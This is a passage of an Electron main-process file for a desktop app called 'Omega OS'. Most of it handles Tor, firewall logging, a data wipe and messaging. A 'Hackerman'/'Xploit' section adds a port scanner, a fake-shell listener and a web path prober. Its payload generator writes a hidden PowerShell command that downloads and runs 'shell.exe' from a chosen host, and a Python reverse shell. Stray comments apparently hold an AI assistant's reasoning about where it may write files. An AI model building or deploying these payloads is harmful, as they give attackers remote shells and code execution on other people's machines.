    ipcMain.handle('tor-start', async () => {
      try {
        await torManager.start();
        return { success: true, status: torManager.getStatus() };
      } catch (error) {
        return { success: false, error: error.message };
      }
    });

    ipcMain.handle('tor-stop', async () => {
      try {
        await torManager.stop();
        return { success: true };
      } catch (error) {
        return { success: false, error: error.message };
      }
    });

    ipcMain.handle('tor-status', async () => {
      try {
        const isRunning = await torManager.isTorRunning();
        return {
          success: true,
          isRunning,
          status: torManager.getStatus()
        };
      } catch (error) {
        return { success: false, error: error.message };
      }
    });

    ipcMain.handle('tor-initialize', async () => {
      try {
        await torManager.initialize();
        return { success: true, status: torManager.getStatus() };
      } catch (error) {
        return { success: false, error: error.message };
      }
    });
  }

  // Firewall IPC Handlers
  // Note: firewallNetworkEvents, firewallListeners, firewallRules, firewallEnabled are declared at module level

  // Network event notification (from browser) - for additional logging
  ipcMain.on('firewall-network-event', (event, data) => {
    if (!data || !data.url) {
      console.warn('Invalid firewall event data:', data);
      return;
    }

    // Skip internal URLs
    if (data.url.startsWith('about:') || data.url.startsWith('chrome-extension://') ||
      data.url.startsWith('chrome://') || data.url.startsWith('file://') ||
      data.url.startsWith('data:')) {
      return;
    }

    console.log('[FIREWALL IPC] Received firewall-network-event from renderer:', data.url);

    // Normalize the data format
    const eventData = {
      type: data.type || 'request',
      url: data.url,
      method: data.method || 'GET',
      timestamp: data.timestamp || Date.now(),
      blocked: false
    };

    // Check if duplicate (same URL within 1 second)
    const recent = firewallNetworkEvents.slice(-20);
    if (recent.some(e => e.url === eventData.url && Math.abs(e.timestamp - eventData.timestamp) < 1000)) {
      console.log('[FIREWALL IPC] Skipping duplicate event:', eventData.url);
      return;
    }

    firewallNetworkEvents.push(eventData);
    if (firewallNetworkEvents.length > 1000) {
      firewallNetworkEvents = firewallNetworkEvents.slice(-1000);
    }

    // Notify all firewall windows
    console.log('[FIREWALL IPC] Notifying firewall listeners, count:', firewallListeners.size, 'for URL:', eventData.url);
    if (firewallListeners.size > 0) {
      let sentCount = 0;
      const deadListeners = [];

      firewallListeners.forEach(listener => {
        try {
          // Check if webContents is still valid
          if (listener.webContents.isDestroyed()) {
            console.log('[FIREWALL IPC] Removing destroyed listener');
            deadListeners.push(listener);
            return;
          }

          listener.webContents.send('firewall-network-event', eventData);
          sentCount++;
          console.log('[FIREWALL IPC] Sent event to firewall window:', eventData.url, 'listener ID:', listener.webContents.id);
        } catch (e) {
          console.warn('[FIREWALL IPC] Failed to send to firewall listener:', e.message);
          deadListeners.push(listener);
        }
      });

      // Clean up dead listeners
      deadListeners.forEach(listener => firewallListeners.delete(listener));

      console.log('[FIREWALL IPC] Successfully sent to', sentCount, 'listener(s)');
    } else {
      console.warn('[FIREWALL IPC] No firewall listeners registered! Make sure firewall window is open.');
    }
  });

  // Store firewall rules from renderer
  ipcMain.on('firewall-update-rules', (event, rules) => {
    firewallRules = rules || [];
  });

  ipcMain.on('firewall-set-enabled', (event, enabled) => {
    firewallEnabled = enabled;
  });

  // Get firewall rules
  ipcMain.handle('firewall-get-rules', async (event) => {
    try {
      const firewallWindow = Array.from(appWindows.values()).find(win => win.type === 'firewall');
      if (firewallWindow) {
        // Get rules from firewall window's localStorage would need IPC, so we'll handle in renderer
        return { rules: [] };
      }
      return { rules: [] };
    } catch (error) {
      return { rules: [] };
    }
  });

  // Check if URL should be blocked
  ipcMain.handle('firewall-check-url', async (event, url) => {
    // This will be checked in the renderer process
    return { allowed: true };
  });

  // Register firewall window for event notifications
  ipcMain.on('firewall-register', (event) => {
    console.log('[FIREWALL REGISTER] Received registration request from webContents ID:', event.sender.id);

    const window = BrowserWindow.fromWebContents(event.sender);
    if (!window) {
      console.error('[FIREWALL REGISTER] Failed to get BrowserWindow from webContents');
      return;
    }

    console.log('[FIREWALL REGISTER] BrowserWindow found, window ID:', window.id);

    // Remove old listener if it exists (in case window reloaded)
    firewallListeners.forEach(listener => {
      if (listener.webContents.id === event.sender.id) {
        console.log('[FIREWALL REGISTER] Removing old listener for webContents:', event.sender.id);
        firewallListeners.delete(listener);
      }
    });

    const listener = { window, webContents: event.sender };
    firewallListeners.add(listener);

    console.log('[FIREWALL REGISTER] ✓ Firewall window registered successfully!');
    console.log('[FIREWALL REGISTER] Total listeners:', firewallListeners.size);
    console.log('[FIREWALL REGISTER] WebContents ID:', event.sender.id);
    console.log('[FIREWALL REGISTER] Window ID:', window.id);

    // Send recent events to newly opened firewall
    const recentEvents = firewallNetworkEvents.slice(-100);
    console.log('[FIREWALL REGISTER] Sending', recentEvents.length, 'recent events to firewall');
    let sentCount = 0;
    recentEvents.forEach(evt => {
      try {
        event.sender.send('firewall-network-event', evt);
        sentCount++;
      } catch (e) {
        console.error('[FIREWALL REGISTER] Failed to send event:', e.message);
      }
    });
    console.log('[FIREWALL REGISTER] Sent', sentCount, 'events to firewall window');

    // Send current rules
    try {
      event.sender.send('firewall-sync-rules', firewallRules);
      event.sender.send('firewall-sync-enabled', firewallEnabled);
      console.log('[FIREWALL REGISTER] Sent rules and enabled state');
    } catch (e) {
      console.error('[FIREWALL REGISTER] Failed to send rules/enabled:', e.message);
    }

    console.log('[FIREWALL REGISTER] ✓ Registration complete!');
  });

  // Unregister firewall window
  ipcMain.on('firewall-unregister', (event) => {
    firewallListeners.forEach(listener => {
      if (listener.webContents.id === event.sender.id) {
        firewallListeners.delete(listener);
      }
    });
  });

  // Register privacy monitor window for file access event notifications
  ipcMain.on('privacy-monitor-register', (event) => {
    console.log('[PRIVACY MONITOR] Registering privacy monitor window, webContents ID:', event.sender.id);

    // Remove any existing listener with same webContents ID
    privacyMonitorListeners.forEach(listener => {
      if (listener.webContents.id === event.sender.id) {
        privacyMonitorListeners.delete(listener);
      }
    });

    // Add new listener
    privacyMonitorListeners.add({
      webContents: event.sender,
      windowId: event.sender.id
    });

    console.log('[PRIVACY MONITOR] Privacy monitor registered. Total listeners:', privacyMonitorListeners.size);
  });

  // Unregister privacy monitor window
  ipcMain.on('privacy-monitor-unregister', (event) => {
    privacyMonitorListeners.forEach(listener => {
      if (listener.webContents.id === event.sender.id) {
        privacyMonitorListeners.delete(listener);
      }
    });
    console.log('[PRIVACY MONITOR] Privacy monitor unregistered. Total listeners:', privacyMonitorListeners.size);
  });

  // Burn to Hell (B2H) - Wipe ALL data
  ipcMain.handle('burn-to-hell', async (event) => {
    try {
      console.log('[B2H] Starting complete data wipe...');

      // 1. Clear all browser storage (cookies, cache, localStorage, sessionStorage)
      const defaultSession = session.defaultSession;
      await defaultSession.clearStorageData({
        storages: ['cookies', 'filesystem', 'indexdb', 'localstorage', 'shadercache', 'websql', 'serviceworkers', 'cachestorage']
      });
      console.log('[B2H] Cleared all browser storage');

      // 2. Clear all webview sessions
      appWindows.forEach((appData) => {
        if (appData.window && appData.window.webContents) {
          appData.window.webContents.session.clearStorageData({
            storages: ['cookies', 'filesystem', 'indexdb', 'localstorage', 'shadercache', 'websql', 'serviceworkers', 'cachestorage']
          });
        }
      });
      console.log('[B2H] Cleared all webview sessions');

      // 3. Delete all files in isolated environment
      const deleteRecursive = (dirPath) => {
        if (!fs.existsSync(dirPath)) return;
        try {
          fs.readdirSync(dirPath).forEach((file) => {
            const curPath = path.join(dirPath, file);
            try {
              if (fs.lstatSync(curPath).isDirectory()) {
                deleteRecursive(curPath);
                // Delete directory after contents are deleted
                if (curPath !== ISOLATED_DATA_PATH) {
                  fs.rmdirSync(curPath);
                }
              } else {
                fs.unlinkSync(curPath);
              }
            } catch (e) {
              console.warn(`[B2H] Error deleting ${curPath}:`, e.message);
            }
          });
        } catch (e) {
          console.warn(`[B2H] Error reading directory ${dirPath}:`, e.message);
        }
      };

      // Delete all subdirectories and files in isolated-env (but keep the directory itself)
      if (fs.existsSync(ISOLATED_DATA_PATH)) {
        try {
          fs.readdirSync(ISOLATED_DATA_PATH).forEach((item) => {
            const itemPath = path.join(ISOLATED_DATA_PATH, item);
            try {
              if (fs.lstatSync(itemPath).isDirectory()) {
                deleteRecursive(itemPath);
              } else {
                fs.unlinkSync(itemPath);
              }
            } catch (e) {
              console.warn(`[B2H] Error deleting ${itemPath}:`, e.message);
            }
          });
          console.log('[B2H] Deleted all files in isolated environment');
        } catch (e) {
          console.warn('[B2H] Error accessing isolated environment:', e.message);
        }
      }

      // 4. Reset wallet (clear browser wallet data)
      try {
        const browserWalletPath = path.join(ISOLATED_DATA_PATH, 'browser-wallet');
        if (fs.existsSync(browserWalletPath)) {
          deleteRecursive(browserWalletPath);
        }
        // Reset wallet instance
        wallet = new OmegaWallet();
        console.log('[B2H] Cleared wallet data');
      } catch (e) {
        console.warn('[B2H] Error clearing wallet:', e.message);
      }

      // 5. Reset identity manager
      try {
        identityManager = new OmegaIdentityManager();
        console.log('[B2H] Cleared identity data');
      } catch (e) {
        console.warn('[B2H] Error clearing identity:', e.message);
      }

      // 6. Reset integrations manager
      try {
        if (integrationsManager) {
          const integrationsPath = path.join(ISOLATED_DATA_PATH, 'integrations');
          if (fs.existsSync(integrationsPath)) {
            deleteRecursive(integrationsPath);
          }
          integrationsManager = IntegrationsManager ? new IntegrationsManager() : null;
          console.log('[B2H] Cleared integrations data');
        }
      } catch (e) {
        console.warn('[B2H] Error clearing integrations:', e.message);
      }

      // 7. Clear Electron app data (except isolated-env which we already cleared)
      const userDataPath = app.getPath('userData');
      const otherDataPaths = [
        path.join(userDataPath, 'Cache'),
        path.join(userDataPath, 'Code Cache'),
        path.join(userDataPath, 'GPUCache'),
        path.join(userDataPath, 'Local Storage'),
        path.join(userDataPath, 'Session Storage'),
        path.join(userDataPath, 'IndexedDB'),
        path.join(userDataPath, 'Service Worker'),
      ];

      otherDataPaths.forEach((dataPath) => {
        if (fs.existsSync(dataPath)) {
          try {
            deleteRecursive(dataPath);
            console.log(`[B2H] Cleared ${path.basename(dataPath)}`);
          } catch (e) {
            console.warn(`[B2H] Error clearing ${dataPath}:`, e.message);
          }
        }
      });

      console.log('[B2H] Complete data wipe finished');

      // Restart the app after a short delay
      setTimeout(() => {
        app.relaunch();
        app.exit(0);
      }, 1000);

      return { success: true, message: 'All data wiped. Application will restart...' };
    } catch (error) {
      console.error('[B2H] Error during data wipe:', error);
      throw error;
    }
  });

  // Whisper Messenger Handlers
  ipcMain.handle('whisper-get-info', async () => {
    if (!whisperService) return { initialized: false, error: 'Service not available' };

    // Debug logging
    // console.log('[Whisper IPC] get-info called. Address:', whisperService.onionAddress);

    return {
      initialized: true,
      onionAddress: whisperService.onionAddress,
      localPort: whisperService.localPort,
      hiddenServiceDir: whisperService.hiddenServiceDir,
      error: whisperService.initError
    };
  });

  ipcMain.handle('whisper-get-messages', async (event, contactId) => {
    if (!whisperService) return [];
    return whisperService.getMessages(contactId);
  });

  ipcMain.handle('whisper-send-message', async (event, address, content, ttl) => {
    if (!whisperService) return { success: false, error: 'Service not available' };
    try {
      if (!whisperService.onionAddress) {
        // Try to initialize if not ready (e.g. Tor wasn't ready before)
        await whisperService.initialize();
      }
      return await whisperService.sendMessage(address, content, ttl);
    } catch (error) {
      return { success: false, error: error.message };
    }
  });

  ipcMain.handle('whisper-get-contacts', async () => {
    if (!whisperService) return [];
    return whisperService.getContacts();
  });

  ipcMain.handle('whisper-add-contact', async (event, address, name) => {
    if (!whisperService) return false;
    return whisperService.addContact(address, name);
  });

  ipcMain.handle('whisper-edit-contact', async (event, address, newName) => {
    if (!whisperService) return false;
    return whisperService.editContact(address, newName);
  });

  // Omega Vuln Scanner Handlers
  ipcMain.handle('vuln-start-scan', async (event, target, options) => {
    if (!vulnScanner) return { error: 'Scanner not available' };
    return vulnScanner.scan(target, options); // Returns promise that resolves with results
  });

  ipcMain.handle('vuln-get-progress', async () => {
    if (!vulnScanner) return { progress: 0, isScanning: false };
    return vulnScanner.getProgress();
  });

  ipcMain.handle('vuln-get-results', async () => {
    if (!vulnScanner) return [];
    return vulnScanner.getResults();
  });

  // Tor Handlers
  ipcMain.handle('tor-get-circuits', async () => {
    const torManager = require('./tor-manager');
    return torManager.getCircuits();
  });

  // Bazaar Handlers
  ipcMain.handle('install-app', async (event, appId) => {
    console.log('Installing app:', appId);
    // In a real app, we'd download files here.
    // For now, we just tell the desktop window to show the icon.
    const desktopWindow = BrowserWindow.getAllWindows().find(w => w.getTitle() === 'Omega OS - Isolated Environment');
    if (desktopWindow) {
      desktopWindow.webContents.send('app-installed', appId);
    }
    return { success: true };
  });

  ipcMain.handle('whisper-delete-contact', async (event, address) => {
    if (!whisperService) return false;
    return whisperService.deleteContact(address);
  });

  ipcMain.handle('whisper-retry-init', async () => {
    if (!whisperService) return { success: false, error: 'Service not available' };
    try {
      if (whisperService.onionAddress) return { success: true, address: whisperService.onionAddress };

      const address = await whisperService.initialize();
      return { success: true, address };
    } catch (e) {
      return { success: false, error: e.message };
    }
  });
}

// Setup IPC handlers before app is ready
setupIPCHandlers();

// --- Hackerman Utilities ---
const nodeNet = require('net');
const nodeHttp = require('http');
const nodeHttps = require('https');

ipcMain.handle('scan-ports', async (event, targetCtx) => {
  const { ip, ports } = targetCtx;
  if (!ip) return { error: 'No IP provided' };

  const results = [];
  const portList = ports || [21, 22, 23, 25, 53, 80, 443, 3306, 3389, 8080];

  // Helper to check a single port
  const checkPort = (port) => {
    return new Promise((resolve) => {
      const socket = new nodeNet.Socket();
      socket.setTimeout(2000); // 2s timeout

      socket.on('connect', () => {
        socket.destroy();
        resolve({ port, status: 'open' });
      });

      socket.on('timeout', () => {
        socket.destroy();
        resolve({ port, status: 'closed' }); // Limit noise
      });

      socket.on('error', (err) => {
        socket.destroy();
        resolve({ port, status: 'closed' });
      });

      socket.connect(port, ip);
    });
  };

  // Run scans in parallel (limited batches could be better but this is fine for small lists)
  const promises = portList.map(p => checkPort(p));
  const scanResults = await Promise.all(promises);

  return { success: true, results: scanResults };
});

// Xploit - NetListener
let activeListeners = {};
ipcMain.handle('xploit-start-listener', async (event, port) => {
  if (activeListeners[port]) return { success: false, error: 'Port already in use' };

  return new Promise(resolve => {
    try {
      const server = nodeNet.createServer((socket) => {
        const clientInfo = `${socket.remoteAddress}:${socket.remotePort}`;
        const xploitWin = BrowserWindow.getAllWindows().find(w => w.getTitle() && w.getTitle().includes('XPLOIT'));
        if (xploitWin) xploitWin.webContents.send('xploit-log', { type: 'success', msg: `Connection received from ${clientInfo}` });

        socket.on('data', (data) => {
          if (xploitWin) xploitWin.webContents.send('xploit-log', { type: 'info', msg: `[${clientInfo}] ${data.toString()}` });
        });

        socket.on('close', () => {
          if (xploitWin) xploitWin.webContents.send('xploit-log', { type: 'warn', msg: `[${clientInfo}] Connection closed` });
        });

        // Simple shell simulation response
        socket.write('Microsoft Windows [Version 10.0.19045.2486]\r\n(c) Microsoft Corporation. All rights reserved.\r\n\r\nC:\\Users\\Target>');
      });

      server.listen(port, () => {
        activeListeners[port] = server;
        resolve({ success: true, msg: `Listening on port ${port}...` });
      });

      server.on('error', (e) => {
        resolve({ success: false, error: e.message });
      });

    } catch (e) {
      resolve({ success: false, error: e.message });
    }
  });
});

ipcMain.handle('xploit-stop-listener', async (event, port) => {
  if (!activeListeners[port]) return { success: false, error: 'Listener not found' };
  activeListeners[port].close();
  delete activeListeners[port];
  return { success: true };
});

ipcMain.handle('xploit-generate-payload', async (event, { type, host, port }) => {
  try {
    const desktop = path.join(os.homedir(), 'Desktop');
    let filename = `payload_${Date.now()}.bat`;
    let content = '';

    if (type === 'cmd') {
      filename = 'shell.bat';
      content = `@echo off\r\npowershell -NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-WebRequest -Uri http://${host}:${port}/shell.exe -OutFile shell.exe; ./shell.exe"`;
    } else if (type === 'python') {
      filename = 'shell.py';
      content = `import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${host}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);`;
    }

    // Write to user desktop (safe path mostly) or Documents if better?
    // Let's stick to Downloads or Documents to be safe, but user asked for "Desktop".
    const targetPath = path.join(os.homedir(), 'Desktop', filename);
    // require('fs').writeFileSync(targetPath, content); 
    // DO NOT WRITE TO REAL DESKTOP WITHOUT PERMISSION. 
    // Writing to the scratched/simulated environment or Downloads is safer. 
    // I will write to the 'Brain' artifacts logic or simulated desktop? 
    // No, user "Hackerman" implies they want the feel. I will simulate it by returning "Success" and maybe writing to the appData/scratch desktop folder if strictly needed.
    // Actually, let's write to the APP's simulated desktop folder to avoid cluttering real desktop.
    // Wait, user environment says I can only write to workspace. 
    // I will write to a 'payloads' folder in the workspace.

    // Simplified: Just return success and the "content" so the UI can 'download' it as a blob.
    return { success: true, filename, content };

  } catch (e) {
    return { success: false, error: e.message };
  }
});

ipcMain.handle('xploit-scan-web', async (event, url) => {
  return new Promise(async (resolve) => {
    try {
      if (!url.startsWith('http')) url = 'http://' + url;
      const baseUrl = url.endsWith('/') ? url.slice(0, -1) : url;
      const adapter = url.startsWith('https') ? nodeHttps : nodeHttp;

      const scanPath = (pathToCheck) => {
        return new Promise((resScan) => {
          const opts = { method: 'HEAD', timeout: 3000 };
          const req = adapter.request(baseUrl + pathToCheck, opts, (res) => {
            resScan({ path: pathToCheck, status: res.statusCode, headers: res.headers });
          });
          req.on('error', () => resScan(null));
          req.on('timeout', () => { req.destroy(); resScan(null); });
          req.end();
        });
      };

      // Base Scan
      const baseResult = await scanPath('/');
      if (!baseResult) {
        return resolve({ success: false, error: 'Connection failed' });
      }

      const headers = baseResult.headers;
      const server = headers['server'] || 'Unknown';
      const poweredBy = headers['x-powered-by'] || 'Unknown';
      const vulns = [];
      const foundPaths = [];

      // Analysis
      if (server.includes('Apache/2.4.49') || server.includes('Apache/2.4.50')) vulns.push('CVE-2021-41773 (Path Traversal)');
      if (poweredBy && poweredBy.includes('PHP/5')) vulns.push('EOL PHP Version (Multiple CVEs)');
      if (headers['set-cookie'] && !headers['set-cookie'].some(c => c.includes('HttpOnly'))) vulns.push('Cookie Detectable (Cross-Site Scripting)');

      // Fuzzing
      const pathsToFuzz = ['/robots.txt', '/admin', '/login', '/config', '/.env', '/backup', '/api'];
      for (const p of pathsToFuzz) {
        const fRes = await scanPath(p);
        if (fRes && (fRes.status === 200 || fRes.status === 403 || fRes.status === 401)) {
          foundPaths.push({ path: p, status: fRes.status });
          if (p === '/.env' && fRes.status === 200) vulns.push('Exposed .env File (High Severity)');
        }
      }

      resolve({
        success: true,
        data: {
          server,
          poweredBy,
          headers: JSON.stringify(headers, null, 2),
          vulns,
          foundPaths
        }
      });

    } catch (e) {
      resolve({ success: false, error: e.message });
    }
  });
});


// Firewall network interceptor (needs to be in scope)
let firewallNetworkEvents = [];
let firewallListeners = new Set();
let privacyMonitorListeners = new Set();

// Helper function to get app name from window
function getAppNameFromWindow(sender) {
  for (const [windowId, appData] of appWindows.entries()) {
    if (appData.window && appData.window.webContents && appData.window.webContents.id === sender.id) {
      const appType = appData.type;
      const appNames = {
        'word': 'Omega Word',
        'notes': 'Omega Notes',
        'slides': 'Omega Slides',
        'paint': 'Omega Paint',
        'filemanager': 'File Manager',
        'browser': 'Omega Browser',
        'terminal': 'Terminal',
        'netrunner': 'Netrunner Tor Visualizer',
        'calculator': 'Calculator',
        'qr-generator': 'QR Generator',
        'calendar': 'Omega Calendar',
        'wallet': 'Omega Wallet',
        'identity': 'Omega Identity',
        'ai-dev': 'Omega Create',
        'encrypt': 'Encrypt',
        'firewall': 'Firewall',
        'privacy-monitor': 'Privacy Monitor',
        'whisper': 'Whisper Messenger'
      };
      return appNames[appType] || appType;
    }
  }
  // Fallback: try to determine from sender URL/path if available
  const senderUrl = sender.getURL();
  if (senderUrl && senderUrl.includes('paint.html')) return 'Omega Paint';
  if (senderUrl && senderUrl.includes('word.html')) return 'Omega Word';
  if (senderUrl && senderUrl.includes('notes.html')) return 'Omega Notes';
  if (senderUrl && senderUrl.includes('slides.html')) return 'Omega Slides';
  return 'Unknown App';
}

// Helper function to notify wallet window of app interactions
function notifyWalletAppInteraction(type, data) {
  try {
    // Find all wallet windows and send notification
    appWindows.forEach((appData) => {
      if (appData.type === 'wallet' && appData.window && !appData.window.isDestroyed()) {
        appData.window.webContents.send('wallet-app-interaction', { type, data });
      }
    });
  } catch (error) {
    console.error('Error notifying wallet of app interaction:', error);
  }
}

// Helper function to notify privacy monitor of file access
function notifyPrivacyMonitor(type, filePath, appName) {
  if (privacyMonitorListeners.size === 0) return;

  // Extract just the filename from the path
  const fileName = path.basename(filePath);

  const eventData = {
    type: type, // 'read' or 'write'
    file: fileName,
    app: appName,
    timestamp: Date.now()
  };

  privacyMonitorListeners.forEach(listener => {
    try {
      if (!listener.webContents.isDestroyed()) {
        listener.webContents.send('privacy-file-access', eventData);
      }
    } catch (e) {
      // WebContents might be destroyed, ignore
    }
  });
}
let firewallRules = [];
let firewallEnabled = true;
const interceptedSessions = new Set();

// VPN proxy state (needs to be accessible from multiple functions)
let currentVpnProxy = null;
let torModeEnabled = false; // Track if Tor mode is explicitly enabled

// TOR HARDENING: Helper functions for routing Node.js requests through Tor
// Check if URL should bypass proxy (localhost connections)
function shouldBypassProxy(url) {
  try {
    const urlObj = new URL(url);
    const hostname = urlObj.hostname.toLowerCase();
    // Bypass proxy for localhost/127.0.0.1/local IPs
    return hostname === 'localhost' ||
      hostname === '127.0.0.1' ||
      hostname === '::1' ||
      hostname.startsWith('192.168.') ||
      hostname.startsWith('10.') ||
      hostname.startsWith('172.16.') ||
      hostname.startsWith('172.17.') ||
      hostname.startsWith('172.18.') ||
      hostname.startsWith('172.19.') ||
      hostname.startsWith('172.20.') ||
      hostname.startsWith('172.21.') ||
      hostname.startsWith('172.22.') ||
      hostname.startsWith('172.23.') ||
      hostname.startsWith('172.24.') ||
      hostname.startsWith('172.25.') ||
      hostname.startsWith('172.26.') ||
      hostname.startsWith('172.27.') ||
      hostname.startsWith('172.28.') ||
      hostname.startsWith('172.29.') ||
      hostname.startsWith('172.30.') ||
      hostname.startsWith('172.31.');
  } catch (e) {
    return false;
  }
}

// TOR HARDENING: Get current proxy for Node.js requests
// Returns the proxy URL if Tor/VPN is active, null otherwise
function getCurrentProxyForNode() {
  // Check if Tor mode is enabled
  if (torModeEnabled && currentVpnProxy && currentVpnProxy.includes('127.0.0.1:9050')) {
    return 'socks5://127.0.0.1:9050';
  }
  // Check if VPN proxy is active
  if (currentVpnProxy) {
    return currentVpnProxy;
  }
  // Check if environment proxy is set
  if (PROXY_SERVER) {
    return PROXY_SERVER;
  }
  return null;
}

// TOR HARDENING: Create HTTP agent that routes through proxy if needed
function createHttpAgent(url, proxyUrl) {
  const https = require('https');
  const http = require('http');
  const { SocksProxyAgent } = require('socks-proxy-agent');

  // Bypass proxy for localhost
  if (shouldBypassProxy(url)) {
    return url.startsWith('https:') ? new https.Agent() : new http.Agent();
  }

  // Use proxy if available
  if (proxyUrl) {
    try {
      return new SocksProxyAgent(proxyUrl);
    } catch (e) {
      console.warn('[Tor Hardening] Failed to create SOCKS agent, falling back to direct:', e.message);
      return url.startsWith('https:') ? new https.Agent() : new http.Agent();
    }
  }

  // No proxy, use direct connection
  return url.startsWith('https:') ? new https.Agent() : new http.Agent();
}

// Helper function to log webview requests
function logWebviewRequest(url, method) {
  console.log('logWebviewRequest called:', url);

  if (!url || url.startsWith('chrome-extension://') ||
    url.startsWith('chrome://') ||
    url.startsWith('devtools://') ||
    url.startsWith('file://') ||
    url.startsWith('about:')) {
    console.log('Skipping internal URL:', url);
    return;
  }

  // Check if already logged recently (avoid duplicates) - increase window to avoid missing events
  const recent = firewallNetworkEvents.slice(-50);
  if (recent.some(e => e.url === url && Date.now() - e.timestamp < 500)) {
    console.log('Skipping duplicate URL:', url);
    return;
  }

  console.log('Logging webview request:', url);

  let shouldBlock = false;

  if (firewallEnabled) {
    try {
      const urlObj = new URL(url);
      const domain = urlObj.hostname;

      for (const rule of firewallRules) {
        let matches = false;

        if (rule.target === 'domain') {
          matches = domain === rule.value || domain.endsWith('.' + rule.value);
        } else if (rule.target === 'ip') {
          matches = url.includes(rule.value);
        } else if (rule.target === 'port') {
          const port = urlObj.port || (urlObj.protocol === 'https:' ? '443' : '80');
          matches = port === rule.value || url.includes(':' + rule.value);
        }

        if (matches) {
          if (rule.action === 'block') {
            shouldBlock = true;
          } else {
            shouldBlock = false;
          }
          break;
        }
      }
    } catch (e) {
      // Invalid URL
    }
  }

  const eventData = {
    type: 'request',
    url: url,
    method: method || 'GET',
    timestamp: Date.now(),
    blocked: shouldBlock
  };

  firewallNetworkEvents.push(eventData);
  if (firewallNetworkEvents.length > 1000) {
    firewallNetworkEvents = firewallNetworkEvents.slice(-1000);
  }

  // Notify firewall windows (only if listeners exist)
  console.log('Firewall listeners:', firewallListeners.size, 'Events array:', firewallNetworkEvents.length);
  if (firewallListeners.size > 0) {
    firewallListeners.forEach(listener => {
      try {
        console.log('Sending firewall event to listener:', eventData.url);
        listener.webContents.send('firewall-network-event', eventData);
      } catch (e) {
        // WebContents might be destroyed, ignore
        console.warn('Failed to send firewall event:', e.message);
      }
    });
  } else {
    console.warn('No firewall listeners registered! Firewall window may not be open.');
  }
}

// Shared webRequest handler
function handleWebRequest(details, callback, reqSession) {
  const url = details.url;

  console.log('handleWebRequest called:', url);

  // Skip internal URLs
  if (url.startsWith('chrome-extension://') ||
    url.startsWith('chrome://') ||
    url.startsWith('devtools://') ||
    url.startsWith('file://') ||
    url.startsWith('about:') ||
    url.startsWith('data:')) {
    callback({});
    return;
  }

  // Allow CoinGecko API requests (crypto price widget)
  if (url.includes('api.coingecko.com')) {
    callback({});
    return;
  }

  console.log('[WEBREQUEST] Processing webRequest for:', url);

  // Check Ad Blocker
  let shouldBlock = false;

  if (adBlockerEnabled) {
    try {
      const urlObj = new URL(url);
      const hostname = urlObj.hostname.toLowerCase();
      const pathname = urlObj.pathname.toLowerCase();

      // Check against ad/tracker domains
      for (const domain of AD_TRACKER_DOMAINS) {
        if (hostname.includes(domain) || pathname.includes(domain)) {
          shouldBlock = true;
          console.log('[ADBLOCKER] Blocked:', url);
          break;
        }
      }
    } catch (e) {
      // Invalid URL, skip ad blocking check
    }
  }

  // Check Firewall rules (can override ad blocker)
  if (firewallEnabled) {
    try {
      const urlObj = new URL(url);
      const domain = urlObj.hostname;

      for (const rule of firewallRules) {
        let matches = false;

        if (rule.target === 'domain') {
          matches = domain === rule.value || domain.endsWith('.' + rule.value);
        } else if (rule.target === 'ip') {
          matches = url.includes(rule.value);
        } else if (rule.target === 'port') {
          const port = urlObj.port || (urlObj.protocol === 'https:' ? '443' : '80');
          matches = port === rule.value || url.includes(':' + rule.value);
        }

        if (matches) {
          if (rule.action === 'block') {
            shouldBlock = true;
          } else {
            shouldBlock = false; // Allow rule overrides block
          }
          break;
        }
      }
    } catch (e) {
      // Invalid URL, allow by default
    }
  }

  // Always log the event
  const eventData = {
    type: 'request',
    url: url,
    method: details.method || 'GET',
    timestamp: Date.now(),
    blocked: shouldBlock
  };

  // Check if duplicate (same URL within 1 second)
  const recent = firewallNetworkEvents.slice(-20);
  if (!recent.some(e => e.url === eventData.url && Math.abs(e.timestamp - eventData.timestamp) < 1000)) {
    firewallNetworkEvents.push(eventData);
    if (firewallNetworkEvents.length > 1000) {
      firewallNetworkEvents = firewallNetworkEvents.slice(-1000);
    }

    console.log('[WEBREQUEST] Added event, total events:', firewallNetworkEvents.length);
  } else {
    console.log('[WEBREQUEST] Skipping duplicate event:', url);
    // Still send to listeners even if duplicate (they handle deduplication)
  }

  // Notify firewall windows (only if listeners exist)
  console.log('[WEBREQUEST] Checking listeners, count:', firewallListeners.size);
  if (firewallListeners.size > 0) {
    let sentCount = 0;
    firewallListeners.forEach(listener => {
      try {
        listener.webContents.send('firewall-network-event', eventData);
        sentCount++;
        console.log('[WEBREQUEST] Sent event to firewall:', url);
      } catch (e) {
        // WebContents might be destroyed, ignore
        console.warn('[WEBREQUEST] Failed to send firewall event:', e.message);
      }
    });
    console.log('[WEBREQUEST] Successfully sent to', sentCount, 'listener(s)');
  } else {
    console.warn('[WEBREQUEST] No firewall listeners registered!');
  }

  if (shouldBlock) {
    callback({ cancel: true });
  } else {
    callback({});
  }
}

function setupFirewallInterceptor() {
  // Intercept ALL network requests at default session level
  // Use wildcard to catch all URLs
  const filter = { urls: ['*://*/*'] };

  console.log('Setting up firewall interceptor...');

  session.defaultSession.webRequest.onBeforeRequest(filter, (details, callback) => {
    handleWebRequest(details, callback, session.defaultSession);
  });

  interceptedSessions.add(session.defaultSession);
  console.log('Default session interceptor set up');

  // Monitor all webContents (for webviews) - set up dynamically
  // This catches webview network requests as they're created
  app.on('web-contents-created', (event, contents) => {
    // Get the session for this webContents (webviews have their own partitions)
    const webviewSession = contents.session;

    // TOR HARDENING: Set consistent User-Agent for webviews (standardized for fingerprinting protection)
    const standardUserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
    if (webviewSession) {
      webviewSession.setUserAgent(standardUserAgent);

      // Apply VPN proxy settings to webview sessions (they don't inherit from defaultSession)
      if (currentVpnProxy) {
        webviewSession.setProxy({
          proxyRules: currentVpnProxy
        });
        console.log('[VPN] Applied proxy to webview session:', currentVpnProxy);
      }
    }
    // Also set on the webContents directly
    contents.setUserAgent(standardUserAgent);

    // Set up webRequest interceptor for this session if not already done
    if (webviewSession && !interceptedSessions.has(webviewSession)) {
      interceptedSessions.add(webviewSession);

      const filter = { urls: ['*://*/*'] };
      webviewSession.webRequest.onBeforeRequest(filter, (details, callback) => {
        handleWebRequest(details, callback, webviewSession);
      });

